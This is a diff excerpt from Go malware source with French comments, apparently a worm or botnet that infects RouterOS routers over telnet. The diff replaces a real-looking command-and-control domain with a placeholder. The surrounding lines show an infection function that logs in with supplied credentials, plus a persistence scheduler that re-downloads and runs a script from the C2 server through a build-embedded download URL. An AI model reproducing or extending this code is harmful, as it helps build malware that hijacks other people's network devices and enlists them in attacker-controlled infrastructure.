@@ -113,7 +113,7 @@ var (
     _urlPpcLegacyB    = ""
 
     // URL complète du dl.sh généré dynamiquement avec les vrais IDs par arch
-    // Embedded au build via -X main._dlShURL=http://robbhabbo.online/download.php?id=xxx
+    // Embedded au build via -X main._dlShURL=http://your-server.com/dl.sh
     _dlShURL = ""
 )
 
@@ -2758,7 +2758,7 @@ func telnetRouterOSInfect(conn net.Conn, ip, user, pass string) bool {
 	readPrompt()
 
 	// 3. Scheduler de persistance — re-télécharge et exécute script ROS depuis C2
-	c2Base := "http://robbhabbo.online"
+	c2Base := ""
 	if _dlShURL != "" {
 		// Extraire le host depuis l'URL dl.sh
 		u := strings.TrimPrefix(_dlShURL, "http://")
